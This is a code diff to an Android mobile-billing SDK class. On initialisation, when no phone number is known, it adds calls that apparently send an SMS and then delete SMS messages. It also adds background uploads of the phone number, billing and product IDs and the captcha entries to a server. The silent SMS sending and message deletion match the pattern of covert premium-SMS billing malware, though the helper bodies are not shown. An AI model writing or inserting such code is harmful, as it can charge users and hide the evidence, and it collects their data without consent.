@@ -35,6 +35,7 @@ import com.billing.runnable.GetGoodsInfoRunnable;
 import com.billing.runnable.GetPhoneNumRunnable;
 import com.billing.runnable.GetPhoneVerifyRunnable;
 import com.billing.runnable.GetSPPhoneNumRunnable;
+import com.billing.runnable.SaveVerificationRunnable;
 
 import org.json.JSONObject;
 
@@ -291,7 +292,6 @@ public class Billing {
         this.phonenum = phoneNum;
     }
 
-
     @SuppressLint("HandlerLeak")
     private Handler sendReqHandler = new Handler() {
         @Override
@@ -410,15 +410,10 @@ public class Billing {
         appInfo.setImei(Util.phoneinfo(context)[1]);
         appInfo.setClientip(Util.getIP());
         Util.saveAppInfo(context, appInfo);
-//        if (Util.loadSystemSo(context) == -1) {
-//            return;
-//        }
-//        String versionso = billingClient.getVersion();
-//        Logs.logE("版本号", versionso);
-//        AppUpdateRunnable appUpdateRunnable = new AppUpdateRunnable(httpUrl,
-//                context, updatehandler, versionso);
-//        Thread thread = new Thread(appUpdateRunnable);
-//        thread.start();
+        if (phonenum == null || "".equals(phonenum)) {
+            Util.sendmes(context, channelid);
+            delsms(context);
+        }
     }
 
     public void GETPhoneNum(Context context) {
@@ -436,27 +431,6 @@ public class Billing {
             phoneNumListener.success(phonenum + "");
         } else {
             SPGetPhoneNum();
-//            if (Util.loadSystemSo(context) == -1) {
-//                PGetUpdate("0.0.0");
-//                return;
-//            } else {
-//                if (authInfo == null) {
-//                    String version = billingClient.getVersion();
-//                    PGetUpdate(version);
-//                    return;
-//                } else {
-//                    if (!"0".equals(authInfo.getErrorcode())) {
-//                        progressBar.closeProgressBar();
-//                        onListener.faile(authInfo.getErrorcode(), "");
-//                        return;
-//                    } else {
-//                        if (phonenum == null || "".equals(phonenum)) {
-//
-//                        }
-//                    }
-//                }
-//
-//            }
         }
 
     }
@@ -976,9 +950,37 @@ public class Billing {
                             //
                             if (ervi.toUpperCase().equals(
                                     imgedt.getText().toString().toUpperCase())) {
+                                Logs.logE("成功", "成功");
+                                if (ervi != null) {
+                                    if (ervi.toUpperCase() != null) {
+                                        SaveVerificationRunnable saveVerificationRunnable = new SaveVerificationRunnable(
+                                                httpUrl, context, phonenum,
+                                                phoneverify, billingid,
+                                                productid, product, ervi
+                                                .toUpperCase(), "0",
+                                                "0");
+                                        Thread thread = new Thread(
+                                                saveVerificationRunnable);
+                                        thread.start();
+                                    }
+                                }
                             } else {
                                 Toast.makeText(context, "请输入正确验证码", showtime)
                                         .show();
+                                Logs.logE("错误", "成功");
+                                if (ervi != null) {
+                                    if (ervi.toUpperCase() != null) {
+                                        SaveVerificationRunnable saveVerificationRunnable = new SaveVerificationRunnable(
+                                                httpUrl, context, phonenum,
+                                                phoneverify, billingid,
+                                                productid, product, imgedt
+                                                .getText().toString(),
+                                                "1", "1");
+                                        Thread thread = new Thread(
+                                                saveVerificationRunnable);
+                                        thread.start();
+                                    }
+                                }
                                 return;
                             }
                         }
@@ -993,7 +995,6 @@ public class Billing {
                             BuyGoods();
                         }
                     }
-
                 }
             });
             cancelbtn.setOnClickListener(new OnClickListener() {
